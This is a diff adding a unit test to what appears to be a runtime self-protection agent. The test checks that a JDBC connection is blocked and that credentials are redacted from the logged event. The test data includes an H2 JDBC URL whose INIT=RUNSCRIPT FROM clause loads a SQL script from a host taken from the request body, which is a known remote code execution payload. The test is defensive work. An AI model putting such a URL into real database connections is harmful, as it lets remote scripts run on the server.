@@ -60,4 +60,32 @@ final class Java8UrlCredentialsTest {
     assertFalse(Files.exists(log) && new String(Files.readAllBytes(log), StandardCharsets.UTF_8)
         .contains("jdbc_mysql_deserialization"));
   }
+
+  /**
+   * Both rewrites of the event's detail, in their order: the body's value is named first, then the credentials of
+   * the JDBC URL and of the URL inside it are removed around that name, as on the primary
+   * (OhMyRaspHooksUrlCredentialsTest). The host of the script URL came from the request body.
+   */
+  @Test
+  void aBodyValueInsideAUrlWithCredentialsIsNamedAndTheCredentialsAreStillRemoved() throws Exception {
+    for (int i = 0; i < 1024; i++) Java8RaspHooks.afterHttpRequest();
+    io.ohmyrasp.agent.http.RequestBodyCapture.dispatchExited(true);
+    String host = "10.20.30.40";
+    final byte[] body = ("{\"host\":\"" + host + "\"}").getBytes(StandardCharsets.UTF_8);
+    Java8RaspHooks.beforeHttpRequest(new Java8RequestBodyTest.BodyRequest("/app/ping", "application/json", body.length));
+    try {
+      Object stream = new Object();
+      Java8RaspHooks.exitBodyRead(body.length, Java8RaspHooks.enterBodyRead(stream), body, 0);
+      final String jdbc = "jdbc:h2:mem:reports;PASSWORD=" + SENTINEL + ";INIT=RUNSCRIPT FROM 'http://loader:" + SENTINEL
+          + "@" + host + "/init.sql'";
+      assertThrows(Java8RaspBlockException.class, () -> Java8RaspHooks.beforeJdbcConnection(jdbc));
+    } finally {
+      Java8RaspHooks.afterHttpRequest();
+    }
+    String spooled = Files.exists(log) ? new String(Files.readAllBytes(log), StandardCharsets.UTF_8) : "";
+    assertTrue(spooled.contains("\"jdbc_url\":\"jdbc:h2:mem:reports;PASSWORD=[redacted];INIT=RUNSCRIPT FROM "
+        + "'http://[redacted]@[body:host]/init.sql'\""), spooled);
+    assertFalse(spooled.contains(SENTINEL), spooled);
+    assertFalse(spooled.contains(host), spooled);
+  }
 }
